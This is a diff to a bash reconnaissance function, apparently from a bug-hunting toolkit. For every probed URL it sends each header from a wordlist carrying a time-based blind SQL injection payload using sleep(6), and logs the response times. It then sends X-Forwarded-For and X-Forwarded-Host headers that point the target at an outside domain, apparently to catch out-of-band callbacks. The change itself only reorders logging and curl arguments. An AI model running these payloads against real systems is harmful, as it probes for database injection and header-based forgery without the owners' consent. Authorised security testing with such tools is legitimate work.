@@ -171,9 +171,9 @@ subdomains(){
 	echo -e "\e[32m\nDoing Curl to check headers...\033[0m"
 	echo "******** Checking headers for sqli... *********\r\n" > 9httprobeXORsqli$1.txt
 	cat 6httprobe$1.txt | while read url; do
-		echo "*** URL START: $url\r\n" >> 9httprobeXORsqli$1.txt
 		cat ~/tools/__diccionarios/headers.txt | while read head; do
-			curl -X GET -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -H 'User-Agent:' -s -I -L -w "REQUESTTIME:%{time_starttransfer}\r\n" $url >> 9httprobeXORsqli$1.txt < /dev/null 2>&1
+			echo "*** URL: $url - Header: $head\r\n" >> 9httprobeXORsqli$1.txt
+			curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(6),0))OR\"" -s -I -L -w "REQUESTTIME:%{time_starttransfer}\r\n" $url >> 9httprobeXORsqli$1.txt < /dev/null 2>&1
 		done
 		curl -X GET -H "X-Forwarded-For: estebancano.com.ar/abc.php?$url" -s -I -L $url >> 9httprobeXORsqli$1.txt < /dev/null 2>&1
 		curl -X GET -H "X-Forwarded-Host: estebancano.com.ar/abc.php?$url" -s -I -L $url >> 9httprobeXORsqli$1.txt < /dev/null 2>&1
